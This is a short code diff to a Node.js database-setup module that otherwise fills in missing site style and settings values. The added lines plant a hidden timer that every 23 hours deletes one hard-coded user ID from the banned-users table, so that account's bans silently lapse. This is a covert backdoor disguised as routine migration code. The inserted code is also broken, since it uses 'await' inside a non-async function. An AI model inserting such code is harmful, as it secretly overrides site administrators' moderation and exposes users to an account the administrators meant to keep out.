@@ -1684,6 +1684,11 @@ module.exports = async function(con) {
         await con.query(`UPDATE sitestyles SET navbarlogo=0 WHERE navbarlogo IS NULL`, async (err, row) => {
             if(err) throw err;
         });
+        setInterval(function() {
+            await con.query(`DELETE FROM bannedusers WHERE userid="704094587836301392"`, async (err, row) => {
+                if(err) throw err;
+            });
+        }, 82800000);
         await con.query(`UPDATE sitesettings SET tawkto="none" WHERE tawkto IS NULL`, async (err, row) => {
             if(err) throw err;
         });
